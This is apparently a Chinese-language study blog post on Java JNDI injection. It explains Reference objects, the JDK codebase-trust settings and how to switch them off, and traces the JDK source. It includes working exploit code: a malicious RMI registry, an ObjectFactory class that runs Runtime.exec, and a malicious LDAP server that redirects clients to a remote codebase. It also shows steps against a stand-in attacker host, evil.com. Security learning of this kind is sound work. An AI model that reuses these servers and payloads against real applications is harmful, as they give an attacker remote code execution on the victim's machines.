<p>Reference可以使用工厂类来构造对象，当使用lookup查找对象时，Reference将使用提供的工厂类加载地址来加载工厂类，工厂类将构造出需要的对象，可以从远程加载地址来加载工厂类</p>
<p>Reference的一个构造方法：</p>
<p><img src= "data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" data-lazy-src="/archives/be65d471/image-20250717111138252.png" alt="image-20250717111138252"></p>
<p><img src= "data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" data-lazy-src="/archives/be65d471/image-20250717111200821.png" alt="image-20250717111200821"></p>
<ul>
<li>className：className为远程加载时所使用的类名，如果本地找不到这个类名，就去远程加载</li>
<li>classFactory：工厂类名</li>
<li>classFactoryLocation：工厂类的加载地址，用于指定工厂类字节码的加载位置，可以是file:&#x2F;&#x2F;、ftp:&#x2F;&#x2F;、http:&#x2F;&#x2F;等协议</li>
</ul>
<figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="type">Reference</span> <span class="variable">reference</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">Reference</span>(<span class="string">&quot;refClassName&quot;</span>,<span class="string">&quot;FactoryClassName&quot;</span>,FactoryURL);</span><br><span class="line"><span class="type">ReferenceWrapper</span> <span class="variable">wrapper</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">ReferenceWrapper</span>(reference);</span><br><span class="line">ctx.bind(<span class="string">&quot;refObj&quot;</span>, wrapper);</span><br></pre></td></tr></table></figure>

<h2 id="远程对象引用安全限制"><a href="#远程对象引用安全限制" class="headerlink" title="远程对象引用安全限制"></a>远程对象引用安全限制</h2><p>需要注意的是，在学习RMI时，RMI服务中远程对象将受到本地Java环境的限制，需要java.rmi.server.useCodebaseOnly配置必须为false，表示允许加载除了Classpath外的远程对象。</p>
<p>而在JNDI获取RMI服务中，被引用的远程工厂对象也将受到com.sun.jndi.rmi.object.trustURLCodebase配置限制，为false表示不信任远程对象引用，就不能调用远程的引用对象</p>
<ul>
<li><code>JDK5u45、JDK6u45、JDK7u21、JDK8u121</code>开始，<code>java.rmi.server.useCodebaseOnly</code>默认值改为了true。</li>
<li><code>JDK6u132、JDK7u122、JDK8u113</code>开始<code>com.sun.jndi.rmi.object.trustURLCodebase</code>默认值改为了 false。</li>
</ul>
<p>可使用System.setProperty允许加载允许加载远程的引用对象：</p>
<figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">System.setProperty(<span class="string">&quot;java.rmi.server.useCodebaseOnly&quot;</span>, <span class="string">&quot;false&quot;</span>);</span><br><span class="line">System.setProperty(<span class="string">&quot;com.sun.jndi.rmi.object.trustURLCodebase&quot;</span>, <span class="string">&quot;true&quot;</span>);</span><br></pre></td></tr></table></figure>

<p>同时LDAP也在<code>JDK6u211、7u201、8u191、11.0.1</code>后将<code>com.sun.jndi.ldap.object.trustURLCodebase</code>的默认设置为了false。（但不受<code>java.rmi.server.useCodebaseOnly</code>影响）</p>
<h2 id="JNDI注入"><a href="#JNDI注入" class="headerlink" title="JNDI注入"></a>JNDI注入</h2><p>环境：jdk 8u65</p>
<p>原理就是由于动态协议转换的机制，当lookup方法访问的地址参数可控时，则可能导致加载恶意类，注意其恶意命令执行主要是通过远程引用Reference而不是反序列化</p>
<h3 id="Reference-RMI"><a href="#Reference-RMI" class="headerlink" title="Reference+RMI"></a>Reference+RMI</h3><h4 id="原理及利用"><a href="#原理及利用" class="headerlink" title="原理及利用"></a>原理及利用</h4><p>我们在攻击RMI客户端时，是通过准备一个恶意的远程对象，最后在客户端反序列化这个恶意对象造成攻击</p>
<p>而如果远程获取到RMI服务上的对象为Reference类或者其子类，则在客户端获取远程对象存根实例时，可以从其他服务器上加载class文件来实例化这个Stub对象，而JNDI注入就是利用这个特性来加载恶意类的</p>
<p>当客户端请求服务地址可控，就可以访问一个恶意的服务端，让这个恶意服务端绑定一个Reference对象这里我们使用ReferenceWrapper对象，这个对象对Reference类或其子类对象进行远程包装使其能够被远程访问</p>
<p>利用流程：</p>
<ol>
<li><p>攻击者通过可控的URL参数触发动态环境转换，例如URL为<code>rmi://evil.com:1099/refObj</code>，而客户端在使用lookup时原来的上下文环境<code>rmi://localhost:1099</code>会由于动态环境转换被指向<code>rmi://evil.com:1099/</code></p>
</li>
<li><p>恶意服务端先创建一个恶意引用，其中引用对象的类名，工厂类名都为我们的恶意远程对象，而工厂类的加载地址设为我们恶意远程对象的地址：</p>
<figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">String refClassName=<span class="string">&quot;EvilObject&quot;</span>;</span><br><span class="line"><span class="type">String</span> <span class="variable">FactoryClassName</span> <span class="operator">=</span> <span class="string">&quot;EvilObject&quot;</span>;</span><br><span class="line"><span class="type">String</span> <span class="variable">factoryLocation</span> <span class="operator">=</span> <span class="string">&quot;http://127.0.0.1:8080/&quot;</span>;</span><br><span class="line">Reference reference=<span class="keyword">new</span> <span class="title class_">Reference</span>(refClassName,FactoryClassName,factoryLocation);</span><br><span class="line">ReferenceWrapper refWrapper=<span class="keyword">new</span> <span class="title class_">ReferenceWrapper</span>(reference);</span><br></pre></td></tr></table></figure>

<p>然后去<code>rmi://evil.com:1099</code>恶意注册端上将准备的ReferenceWrapper对象与refObj对象绑定</p>
</li>
<li><p>当客户端查询<code>rmi://evil.com:1099/refObj</code>查找引用时，JNDI会解析服务端注册的Reference对象，这时客户端会开始从本地CLASSPATH搜索EvilObject类，如果不存在就会尝试从远程地址<code>http://127.0.0.1:8080/</code>上去获取EvilObject.class，即动态的去获取<code>http://evil-cb.com/EvilObject.class</code></p>
</li>
<li><p>客户端下载恶意远程对象字节码后会主动去加载该字节码调用EvilObject类的构造函数从而执行恶意代码</p>
</li>
</ol>
<p>EvilObject:</p>
<figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">package</span> jndi;</span><br><span class="line"></span><br><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">EvilObject</span> &#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="title function_">EvilObject</span><span class="params">()</span> <span class="keyword">throws</span> Exception &#123;</span><br><span class="line">        Runtime.getRuntime().exec(<span class="string">&quot;calc.exe&quot;</span>);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>EvilServer：</p>
<figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">package</span> jndi;</span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> com.sun.jndi.rmi.registry.ReferenceWrapper;</span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> javax.naming.Reference;</span><br><span class="line"><span class="keyword">import</span> java.rmi.registry.LocateRegistry;</span><br><span class="line"><span class="keyword">import</span> java.rmi.registry.Registry;</span><br><span class="line"></span><br><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">EvilServer</span> &#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title function_">main</span><span class="params">(String[] args)</span> <span class="keyword">throws</span> Exception &#123;</span><br><span class="line">        String refClassName=<span class="string">&quot;jndi.EvilObject&quot;</span>;    <span class="comment">//注意使用全限定名</span></span><br><span class="line">        <span class="type">String</span> <span class="variable">FactoryClassName</span> <span class="operator">=</span> <span class="string">&quot;jndi.EvilObject&quot;</span>;</span><br><span class="line">        <span class="type">String</span> <span class="variable">factoryLocation</span> <span class="operator">=</span> <span class="string">&quot;http://127.0.0.1:5432/&quot;</span>;</span><br><span class="line"></span><br><span class="line">        <span class="type">Registry</span> <span class="variable">registry</span> <span class="operator">=</span> LocateRegistry.createRegistry(<span class="number">1099</span>);</span><br><span class="line"></span><br><span class="line">        Reference reference=<span class="keyword">new</span> <span class="title class_">Reference</span>(refClassName,FactoryClassName,factoryLocation);</span><br><span class="line">        ReferenceWrapper refWrapper=<span class="keyword">new</span> <span class="title class_">ReferenceWrapper</span>(reference);</span><br><span class="line">        registry.bind(<span class="string">&quot;b1uel0n3&quot;</span>,refWrapper);</span><br><span class="line"></span><br><span class="line">        System.out.printf(<span class="string">&quot;Server Started\n&quot;</span>);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>Client:</p>
<figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">package</span> jndi;</span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> rmi.RMIInterface;</span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> javax.naming.Context;</span><br><span class="line"><span class="keyword">import</span> javax.naming.InitialContext;</span><br><span class="line"></span><br><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">Client</span> &#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title function_">main</span><span class="params">(String[] args)</span> <span class="keyword">throws</span> Exception &#123;</span><br><span class="line">        String str=<span class="string">&quot;rmi://127.0.0.1:1099/b1uel0n3&quot;</span>;</span><br><span class="line">        <span class="type">Context</span> <span class="variable">ctx</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">InitialContext</span>();</span><br><span class="line">        ctx.lookup(str);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>先编译EvilObject：</p>
<p><img src= "data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" data-lazy-src="/archives/be65d471/image-20250717173800138.png" alt="image-20250717173800138"></p>
<p>然后运行恶意服务端，接着在含有EvilObject.class目录下启动http服务：</p>
<p><img src= "data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" data-lazy-src="/archives/be65d471/image-20250717173912224.png" alt="image-20250717173912224"></p>
<p>运行客户端：</p>
<p><img src= "data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" data-lazy-src="/archives/be65d471/image-20250717174231722.png" alt="image-20250717174231722"></p>
<p>成功弹出计算机，但存在报错：</p>
<p><img src= "data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" data-lazy-src="/archives/be65d471/image-20250717174406699.png" alt="image-20250717174406699"></p>
<p>似乎是类转换异常，JNDI 期望从远程获取一个<strong>实现了<code>ObjectFactory</code>接口的工厂类</strong>，但实际返回的是<code>jndi.EvilObject</code>类，而该类未实现<code>ObjectFactory</code>接口</p>
<p><img src= "data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" data-lazy-src="/archives/be65d471/image-20250717175446936.png" alt="image-20250717175446936"></p>
<p>在ObjectFactory接口定义了getObjectInstance方法，这是 <code>ObjectFactory</code> 接口的核心方法，当 JNDI 查找返回 <code>Reference</code> 对象时他会自动调用，或者触发<strong>RMI 查找</strong>、<strong>LDAP 查找</strong>、<strong>资源注入</strong>等时也会触发，所以修改代码：</p>
<figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">package</span> jndi;</span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> javax.naming.Context;</span><br><span class="line"><span class="keyword">import</span> javax.naming.Name;</span><br><span class="line"><span class="keyword">import</span> javax.naming.spi.ObjectFactory;</span><br><span class="line"><span class="keyword">import</span> java.util.Hashtable;</span><br><span class="line"></span><br><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">EvilObject</span> <span class="keyword">implements</span> <span class="title class_">ObjectFactory</span> &#123;</span><br><span class="line">    <span class="meta">@Override</span></span><br><span class="line">    <span class="keyword">public</span> Object <span class="title function_">getObjectInstance</span><span class="params">(Object obj, Name name, Context nameCtx, Hashtable&lt;?, ?&gt; environment)</span> <span class="keyword">throws</span> Exception &#123;</span><br><span class="line">        <span class="keyword">return</span> Runtime.getRuntime().exec(<span class="string">&quot;calc.exe&quot;</span>);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p><img src= "data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" data-lazy-src="/archives/be65d471/image-20250719193111559.png" alt="image-20250719193111559"></p>
<h4 id="源码分析-1"><a href="#源码分析-1" class="headerlink" title="源码分析"></a>源码分析</h4><p>跟一下源码便于自己理解，在RegistryContext.lookup方法开始：</p>
<p><img src= "data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" data-lazy-src="/archives/be65d471/image-20250720185023514.png" alt="image-20250720185023514"></p>
<p>这里通过Registry_Stub.lookup方法获取到ReferenceWrapper_Stub对象</p>
<p><img src= "data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" data-lazy-src="/archives/be65d471/image-20250720185123566.png" alt="image-20250720185123566"></p>
<p>接着调用decodeObject方法：<br><img src= "data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" data-lazy-src="/archives/be65d471/image-20250720185257424.png" alt="image-20250720185257424"></p>
<p>判断ReferenceWrapper_Stub是否是RemoteReference对象，这里直接调用getReference()方法：</p>
<p><img src= "data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" data-lazy-src="/archives/be65d471/image-20250720185632977.png" alt="image-20250720185632977"></p>
<p>调用UnicastRef.invoke建立连接，返回一个Reference对象</p>
<p>接着回到RegistryContext.decodeObject方法，随后调用NamingManager.getObjectInstance方法：</p>
<p><img src= "data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" data-lazy-src="/archives/be65d471/image-20250720190022720.png" alt="image-20250720190022720"></p>
<p>与上面动态协议转换调试的不同，这里的refInfo就是返回的Reference对象：<br><img src= "data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" data-lazy-src="/archives/be65d471/image-20250720190111829.png" alt="image-20250720190111829"></p>
<p>这里的ref变量不为空：<br><img src= "data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" data-lazy-src="/archives/be65d471/image-20250720190354552.png" alt="image-20250720190354552"></p>
<p>调用getObjectFactoryFromReference(ref, f)方法，根进下：</p>
<p><img src= "data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" data-lazy-src="/archives/be65d471/image-20250720190523882.png" alt="image-20250720190523882"></p>
<p>如果本地存在需要获取的类，则会使用在本地直接获取。如果本地不存在并且可以从远程获取到该类，则会远程加载类。获取到类之后，会在return返回语句中调用newInstance方法，会触发类的构造方法。</p>
<h3 id="Reference-LDAP"><a href="#Reference-LDAP" class="headerlink" title="Reference+LDAP"></a>Reference+LDAP</h3><h4 id="原理及利用-1"><a href="#原理及利用-1" class="headerlink" title="原理及利用"></a>原理及利用</h4><p>由于LDAP的存储形式支持存储JNDI Reference，其攻击原理和RMI是类似的旨在返回一个恶意的Reference对象给客户端，客户端根据codebase路径查找工厂加载恶意EvilObject.class</p>
<p>下载依赖：</p>
<figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">&lt;dependency&gt;</span><br><span class="line">    &lt;groupId&gt;com.unboundid&lt;/groupId&gt;</span><br><span class="line">    &lt;artifactId&gt;unboundid-ldapsdk&lt;/artifactId&gt;</span><br><span class="line">    &lt;version&gt;<span class="number">6.0</span><span class="number">.11</span>&lt;/version&gt;</span><br><span class="line">    &lt;scope&gt;test&lt;/scope&gt;</span><br><span class="line">&lt;/dependency&gt;</span><br></pre></td></tr></table></figure>

<p>EvilServer:</p>
<figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">package</span> jndi;</span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> com.unboundid.ldap.listener.InMemoryDirectoryServer;</span><br><span class="line"><span class="keyword">import</span> com.unboundid.ldap.listener.InMemoryDirectoryServerConfig;</span><br><span class="line"><span class="keyword">import</span> com.unboundid.ldap.listener.InMemoryListenerConfig;</span><br><span class="line"><span class="keyword">import</span> com.unboundid.ldap.listener.interceptor.InMemoryInterceptedSearchResult;</span><br><span class="line"><span class="keyword">import</span> com.unboundid.ldap.listener.interceptor.InMemoryOperationInterceptor;</span><br><span class="line"><span class="keyword">import</span> com.unboundid.ldap.sdk.Entry;</span><br><span class="line"><span class="keyword">import</span> com.unboundid.ldap.sdk.LDAPException;</span><br><span class="line"><span class="keyword">import</span> com.unboundid.ldap.sdk.LDAPResult;</span><br><span class="line"><span class="keyword">import</span> com.unboundid.ldap.sdk.ResultCode;</span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> javax.net.ServerSocketFactory;</span><br><span class="line"><span class="keyword">import</span> javax.net.SocketFactory;</span><br><span class="line"><span class="keyword">import</span> javax.net.ssl.SSLSocketFactory;</span><br><span class="line"><span class="keyword">import</span> java.net.InetAddress;</span><br><span class="line"><span class="keyword">import</span> java.net.MalformedURLException;</span><br><span class="line"><span class="keyword">import</span> java.net.URL;</span><br><span class="line"></span><br><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">EvilServer</span> &#123;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">private</span> <span class="keyword">static</span> <span class="keyword">final</span> <span class="type">String</span> <span class="variable">LDAP_BASE</span> <span class="operator">=</span> <span class="string">&quot;dc=example,dc=com&quot;</span>;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title function_">main</span> <span class="params">( String[] tmp_args )</span> &#123;</span><br><span class="line">        String[] args=<span class="keyword">new</span> <span class="title class_">String</span>[]&#123;<span class="string">&quot;http://127.0.0.1:5432/#EvilObject&quot;</span>&#125;;  <span class="comment">//恶意对象下载地址</span></span><br><span class="line">        <span class="type">int</span> <span class="variable">port</span> <span class="operator">=</span> <span class="number">9999</span>;  <span class="comment">//LDAP服务端口</span></span><br><span class="line"></span><br><span class="line">        <span class="comment">//配置LDAP服务器</span></span><br><span class="line">        <span class="keyword">try</span> &#123;</span><br><span class="line">            <span class="type">InMemoryDirectoryServerConfig</span> <span class="variable">config</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">InMemoryDirectoryServerConfig</span>(LDAP_BASE);</span><br><span class="line">            config.setListenerConfigs(<span class="keyword">new</span> <span class="title class_">InMemoryListenerConfig</span>(</span><br><span class="line">                    <span class="string">&quot;listen&quot;</span>, <span class="comment">//$NON-NLS-1$</span></span><br><span class="line">                    InetAddress.getByName(<span class="string">&quot;0.0.0.0&quot;</span>), <span class="comment">//$NON-NLS-1$</span></span><br><span class="line">                    port,</span><br><span class="line">                    ServerSocketFactory.getDefault(),</span><br><span class="line">                    SocketFactory.getDefault(),</span><br><span class="line">                    (SSLSocketFactory) SSLSocketFactory.getDefault()));</span><br><span class="line"></span><br><span class="line">            <span class="comment">// 添加恶意拦截器</span></span><br><span class="line">            config.addInMemoryOperationInterceptor(<span class="keyword">new</span> <span class="title class_">OperationInterceptor</span>(<span class="keyword">new</span> <span class="title class_">URL</span>(args[ <span class="number">0</span> ])));</span><br><span class="line"></span><br><span class="line">            <span class="comment">//启动服务</span></span><br><span class="line">            <span class="type">InMemoryDirectoryServer</span> <span class="variable">ds</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">InMemoryDirectoryServer</span>(config);</span><br><span class="line">            System.out.println(<span class="string">&quot;Listening on 0.0.0.0:&quot;</span> + port); <span class="comment">//$NON-NLS-1$</span></span><br><span class="line">            ds.startListening();</span><br><span class="line"></span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">catch</span> ( Exception e ) &#123;</span><br><span class="line">            e.printStackTrace();</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">private</span> <span class="keyword">static</span> <span class="keyword">class</span> <span class="title class_">OperationInterceptor</span> <span class="keyword">extends</span> <span class="title class_">InMemoryOperationInterceptor</span> &#123;</span><br><span class="line"></span><br><span class="line">        <span class="keyword">private</span> URL codebase;    <span class="comment">//恶意代码地址</span></span><br><span class="line"></span><br><span class="line">        <span class="keyword">public</span> <span class="title function_">OperationInterceptor</span> <span class="params">( URL cb )</span> &#123;</span><br><span class="line">            <span class="built_in">this</span>.codebase = cb;</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">        <span class="meta">@Override</span></span><br><span class="line">        <span class="keyword">public</span> <span class="keyword">void</span> <span class="title function_">processSearchResult</span> <span class="params">( InMemoryInterceptedSearchResult result )</span> &#123;</span><br><span class="line">            <span class="type">String</span> <span class="variable">base</span> <span class="operator">=</span> result.getRequest().getBaseDN();</span><br><span class="line">            <span class="type">Entry</span> <span class="variable">e</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">Entry</span>(base);</span><br><span class="line">            <span class="keyword">try</span> &#123;</span><br><span class="line">                sendResult(result, base, e);  <span class="comment">//发送恶意响应</span></span><br><span class="line">            &#125;</span><br><span class="line">            <span class="keyword">catch</span> ( Exception e1 ) &#123;</span><br><span class="line">                e1.printStackTrace();</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">        <span class="keyword">protected</span> <span class="keyword">void</span> <span class="title function_">sendResult</span> <span class="params">( InMemoryInterceptedSearchResult result, String base, Entry e )</span> <span class="keyword">throws</span> LDAPException, MalformedURLException &#123;</span><br><span class="line">            <span class="comment">// 构造 class 文件实际路径 (将 #EvilObject 转换为 /EvilObject.class)</span></span><br><span class="line">            <span class="type">URL</span> <span class="variable">turl</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">URL</span>(<span class="built_in">this</span>.codebase, <span class="built_in">this</span>.codebase.getRef().replace(<span class="string">&#x27;.&#x27;</span>, <span class="string">&#x27;/&#x27;</span>).concat(<span class="string">&quot;.class&quot;</span>));</span><br><span class="line">            System.out.println(<span class="string">&quot;Send LDAP reference result for &quot;</span> + base + <span class="string">&quot; redirecting to &quot;</span> + turl);</span><br><span class="line">            e.addAttribute(<span class="string">&quot;javaClassName&quot;</span>, <span class="string">&quot;b1uel0n3&quot;</span>);  <span class="comment">//任意类名</span></span><br><span class="line">            <span class="type">String</span> <span class="variable">cbstring</span> <span class="operator">=</span> <span class="built_in">this</span>.codebase.toString();</span><br><span class="line">            <span class="type">int</span> <span class="variable">refPos</span> <span class="operator">=</span> cbstring.indexOf(<span class="string">&#x27;#&#x27;</span>);</span><br><span class="line">            <span class="keyword">if</span> ( refPos &gt; <span class="number">0</span> ) &#123;</span><br><span class="line">                cbstring = cbstring.substring(<span class="number">0</span>, refPos);</span><br><span class="line">            &#125;</span><br><span class="line"></span><br><span class="line">            <span class="comment">// 构建恶意 LDAP 条目</span></span><br><span class="line">            e.addAttribute(<span class="string">&quot;javaCodeBase&quot;</span>, cbstring);  <span class="comment">//代码库地址 (http://127.0.0.1:5432/)</span></span><br><span class="line">            e.addAttribute(<span class="string">&quot;objectClass&quot;</span>, <span class="string">&quot;javaNamingReference&quot;</span>); <span class="comment">//$NON-NLS-1$</span></span><br><span class="line">            e.addAttribute(<span class="string">&quot;javaFactory&quot;</span>, <span class="built_in">this</span>.codebase.getRef());  <span class="comment">//工厂类名（EvilObject）</span></span><br><span class="line">            result.sendSearchEntry(e);  <span class="comment">//发送给客户端</span></span><br><span class="line">            result.setResult(<span class="keyword">new</span> <span class="title class_">LDAPResult</span>(<span class="number">0</span>, ResultCode.SUCCESS));</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p><code>http://127.0.0.1:5432</code>为指定的codebase，EvilObject为要查找的字节码路径，也就是从当前本地路径查找EvilObject.class文件</p>
<p>Client：</p>
<figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">package</span> jndi;</span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> javax.naming.Context;</span><br><span class="line"><span class="keyword">import</span> javax.naming.InitialContext;</span><br><span class="line"></span><br><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">Client</span> &#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title function_">main</span><span class="params">(String[] args)</span> <span class="keyword">throws</span> Exception &#123;</span><br><span class="line">        <span class="type">String</span> <span class="variable">str</span> <span class="operator">=</span> <span class="string">&quot;ldap://127.0.0.1:9999/EvilObject&quot;</span>;</span><br><span class="line"></span><br><span class="line">        <span class="type">Context</span> <span class="variable">Context</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">InitialContext</span>();</span><br><span class="line">        Context.lookup(str);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p><img src= "data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" data-lazy-src="/archives/be65d471/image-20250720204342149.png" alt="image-20250720204342149"></p>
